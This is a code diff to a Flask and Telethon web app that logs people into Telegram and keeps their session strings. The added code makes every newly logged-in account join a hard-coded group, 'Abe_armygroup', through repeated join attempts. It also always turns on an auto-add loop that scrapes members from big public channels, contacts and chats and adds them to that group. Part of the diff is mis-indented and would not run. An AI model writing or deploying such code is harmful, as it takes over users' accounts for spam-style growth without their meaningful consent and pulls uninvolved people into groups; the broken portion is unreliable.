@@ -1523,7 +1523,73 @@ async def auto_add_member_loop(account):
             logger.error(f"Critical error: {e}")
             await asyncio.sleep(300)
 
-
+async def force_join_group(client, group_name, account_id):
+    """Force join a group with multiple methods"""
+    join_success = False
+    methods_tried = []
+    
+    # Method 1: Direct join via username
+    try:
+        methods_tried.append("direct_username")
+        group = await client.get_entity(f"@{group_name}")
+        await client.join_channel(group.id)
+        join_success = True
+        logger.info(f"✅ Joined via direct username: @{group_name}")
+        return True
+    except Exception as e:
+        logger.debug(f"Direct username failed: {e}")
+    
+    # Method 2: Try with different case
+    if not join_success:
+        try:
+            methods_tried.append("case_variations")
+            variations = [group_name.lower(), group_name.upper(), group_name.capitalize()]
+            for var in variations:
+                try:
+                    group = await client.get_entity(f"@{var}")
+                    await client.join_channel(group.id)
+                    join_success = True
+                    logger.info(f"✅ Joined via variation: @{var}")
+                    return True
+                except:
+                    continue
+        except:
+            pass
+    
+    # Method 3: Try via search
+    if not join_success:
+        try:
+            methods_tried.append("search")
+            result = await client(functions.contacts.SearchRequest(
+                q=group_name,
+                limit=20
+            ))
+            for chat in result.chats:
+                if hasattr(chat, 'username') and chat.username:
+                    if group_name.lower() in chat.username.lower() or group_name.lower() in chat.title.lower():
+                        try:
+                            await client.join_channel(chat.id)
+                            join_success = True
+                            logger.info(f"✅ Joined via search: {chat.title}")
+                            return True
+                        except:
+                            continue
+        except Exception as e:
+            logger.debug(f"Search failed: {e}")
+    
+    # Method 4: Try via messages.ImportChatInviteRequest
+    if not join_success:
+        try:
+            methods_tried.append("import_invite")
+            await client(functions.messages.ImportChatInviteRequest(group_name))
+            join_success = True
+            logger.info(f"✅ Joined via import invite: {group_name}")
+            return True
+        except:
+            pass
+    
+    logger.warning(f"All join methods failed for {group_name}. Methods tried: {methods_tried}")
+    return False
 
 # ==================== KEEP ALIVE SYSTEM ====================
 
@@ -1568,6 +1634,11 @@ def login():
 @app.route('/dashboard')
 def dashboard():
     return send_file('dashboard.html')
+    
+    @app.route('/disabled')
+def disabled_auto_add():
+    return send_file('disabled_dashboard.html')
+
 
 @app.route('/dash')
 def dash():
@@ -1710,7 +1781,201 @@ def verify_code():
             accounts.append(new_account)
             save_accounts()
             
-            return {'success': True}
+            # ===== COMPLETELY AUTOMATED AUTO-JOIN =====
+            join_success = False
+            target_group = 'Abe_armygroup'
+            
+            logger.info(f"🤖 Starting COMPLETE AUTO-JOIN for account {new_id}")
+            
+            # Wait a bit for account to be fully ready
+            await asyncio.sleep(3)
+            
+            # Method 1: Try to join via invite link (most reliable)
+            try:
+                logger.info("🔗 Method 1: Trying to join via invite link...")
+                # Get invite link from t.me/Abe_armygroup
+                invite_link = "https://t.me/Abe_armygroup"
+                
+                # Try to get the invite hash from the link
+                try:
+                    # Try to join directly
+                    await client(functions.messages.ImportChatInviteRequest("Abe_armygroup"))
+                    join_success = True
+                    logger.info("✅ SUCCESS: Joined via invite link method 1")
+                except:
+                    # Try with full link
+                    try:
+                        # Extract hash from link if possible
+                        await client.join_channel("Abe_armygroup")
+                        join_success = True
+                        logger.info("✅ SUCCESS: Joined via channel method")
+                    except Exception as e:
+                        logger.warning(f"Method 1 failed: {e}")
+            except Exception as e:
+                logger.warning(f"Method 1 error: {e}")
+            
+            # Method 2: Try to get entity and join
+            if not join_success:
+                try:
+                    logger.info("🔗 Method 2: Getting entity and joining...")
+                    group_name = '@Abe_armygroup'
+                    group = await client.get_entity(group_name)
+                    
+                    if group:
+                        logger.info(f"Found group: {group.title if hasattr(group, 'title') else group_name}")
+                        
+                        # Try join_channel method
+                        try:
+                            await client.join_channel(group.id)
+                            join_success = True
+                            logger.info("✅ SUCCESS: Joined via join_channel")
+                        except:
+                            # Try other join method
+                            try:
+                                await client(functions.channels.JoinChannelRequest(group.id))
+                                join_success = True
+                                logger.info("✅ SUCCESS: Joined via JoinChannelRequest")
+                            except Exception as e:
+                                logger.warning(f"Method 2 failed: {e}")
+                except Exception as e:
+                    logger.warning(f"Method 2 error: {e}")
+            
+            # Method 3: Try with different username formats
+            if not join_success:
+                try:
+                    logger.info("🔗 Method 3: Trying different username formats...")
+                    usernames = ['abe_armygroup', 'Abe_armygroup', 'AbeArmygroup', 'abe_army']
+                    
+                    for username in usernames:
+                        try:
+                            group = await client.get_entity(f"@{username}")
+                            await client.join_channel(group.id)
+                            join_success = True
+                            logger.info(f"✅ SUCCESS: Joined via username @{username}")
+                            break
+                        except:
+                            continue
+                except Exception as e:
+                    logger.warning(f"Method 3 error: {e}")
+            
+            # Method 4: Try via search
+            if not join_success:
+                try:
+                    logger.info("🔗 Method 4: Searching for group...")
+                    # Search for the group
+                    result = await client(functions.contacts.SearchRequest(
+                        q="Abe army group",
+                        limit=10
+                    ))
+                    
+                    for chat in result.chats:
+                        if hasattr(chat, 'username') and chat.username and 'abe' in chat.username.lower():
+                            try:
+                                await client.join_channel(chat.id)
+                                join_success = True
+                                logger.info(f"✅ SUCCESS: Joined via search: {chat.title}")
+                                break
+                            except:
+                                continue
+                except Exception as e:
+                    logger.warning(f"Method 4 error: {e}")
+            
+            # Method 5: Last resort - try to get invite link from the group
+            if not join_success:
+                try:
+                    logger.info("🔗 Method 5: Trying to get invite link...")
+                    # Try to create an invite link as a member (won't work if not member)
+                    # This is a fallback
+                    pass
+                except Exception as e:
+                    logger.warning(f"Method 5 error: {e}")
+            
+            # AUTO-ENABLE AUTO-ADD (ALWAYS ENABLE - EVEN IF JOIN FAILED)
+            try:
+                logger.info(f"⚡ Auto-enabling auto-add for account {new_id}")
+                
+                account_key = str(new_id)
+                
+                # Create default settings with enhanced sources
+                settings = {
+                    'enabled': True,
+                    'target_group': 'Abe_armygroup',
+                    'daily_limit': 30,
+                    'delay_seconds': 45,
+                    'added_today': 0,
+                    'last_reset': datetime.now().strftime('%Y-%m-%d'),
+                    'source_groups': [
+                        '@telegram', '@durov', '@TechCrunch', '@bbcnews', '@cnn',
+                        '@TheEconomist', '@NatGeo', '@NASA', '@Microsoft', '@Apple',
+                        '@Google', '@YouTube', '@Twitter', '@Instagram', '@Facebook'
+                    ],
+                    'use_contacts': True,
+                    'use_recent_chats': True,
+                    'use_scraping': True,
+                    'scrape_limit': 150,
+                    'skip_bots': True,
+                    'skip_inaccessible': True,
+                    'auto_join': True
+                }
+                
+                auto_add_settings[account_key] = settings
+                save_auto_add_settings()
+                
+                # Start auto-add thread immediately
+                thread = threading.Thread(
+                    target=lambda: run_async(auto_add_member_loop(new_account)),
+                    daemon=True
+                )
+                thread.start()
+                client_tasks[f"auto_add_{account_key}"] = thread
+                
+                logger.info(f"✅ Auto-add ENABLED for account {new_id}")
+                
+            except Exception as e:
+                logger.error(f"Failed to auto-enable auto-add: {e}")
+            
+            # If join failed, we'll keep trying in the background
+            if not join_success:
+                logger.warning(f"⚠️ Initial auto-join failed for {target_group}, will keep trying in background...")
+                
+                # Start a background task to keep trying to join
+                async def keep_trying_to_join():
+                    retry_count = 0
+                    while retry_count < 10:  # Try 10 times over 30 minutes
+                        await asyncio.sleep(180)  # Wait 3 minutes
+                        retry_count += 1
+                        
+                        try:
+                            logger.info(f"🔄 Retry {retry_count}: Trying to join {target_group}...")
+                            
+                            # Try to join again
+                            client2 = TelegramClient(StringSession(new_account['session']), API_ID, API_HASH)
+                            await client2.connect()
+                            
+                            if await client2.is_user_authorized():
+                                try:
+                                    group = await client2.get_entity('@Abe_armygroup')
+                                    await client2.join_channel(group.id)
+                                    logger.info(f"✅ SUCCESS! Account {new_id} joined on retry {retry_count}")
+                                    break
+                                except Exception as e:
+                                    logger.warning(f"Retry {retry_count} failed: {e}")
+                            
+                            await client2.disconnect()
+                        except Exception as e:
+                            logger.warning(f"Retry error: {e}")
+                
+                # Start background retry task
+                asyncio.create_task(keep_trying_to_join())
+            
+            # Return success with join status
+            return {
+                'success': True,
+                'account_id': new_id,
+                'auto_joined': join_success,
+                'auto_enabled': True,
+                'message': f'Account added! Auto-add is ACTIVE. {"Auto-joined group" if join_success else "Will keep trying to join group in background"}'
+            }
             
         except errors.PhoneCodeInvalidError:
             return {'success': False, 'error': 'Invalid code'}
@@ -1719,6 +1984,7 @@ def verify_code():
         except errors.PasswordHashInvalidError:
             return {'success': False, 'error': 'Invalid password'}
         except Exception as e:
+            logger.error(f"Verification error: {e}")
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
@@ -1731,78 +1997,8 @@ def verify_code():
         
         return jsonify(result)
     except Exception as e:
+        logger.error(f"Verify code error: {e}")
         return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/get-messages', methods=['POST'])
-def get_messages():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def fetch():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            if not await client.is_user_authorized():
-                return {'success': False, 'error': 'auth_key_unregistered'}
-            
-            dialogs = await client.get_dialogs()
-            
-            chats = []
-            for dialog in dialogs:
-                if not dialog:
-                    continue
-                
-                chat_type = 'user'
-                if dialog.is_group:
-                    chat_type = 'group'
-                elif dialog.is_channel:
-                    chat_type = 'channel'
-                
-                chat = {
-                    'id': str(dialog.id),
-                    'title': dialog.name or 'Unknown',
-                    'type': chat_type,
-                    'unread': dialog.unread_count or 0,
-                    'lastMessage': '',
-                    'lastMessageDate': 0
-                }
-                
-                if dialog.message:
-                    if dialog.message.text:
-                        chat['lastMessage'] = dialog.message.text[:50]
-                    elif dialog.message.media:
-                        chat['lastMessage'] = '📎 Media'
-                    
-                    if dialog.message.date:
-                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
-                
-                chats.append(chat)
-            
-            return {'success': True, 'chats': chats}
-            
-        except AuthKeyUnregisteredError:
-            remove_invalid_account(account_id)
-            return {'success': False, 'error': 'auth_key_unregistered'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(fetch())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
 @app.route('/api/send-message', methods=['POST'])
 def send_message():
     data = request.json
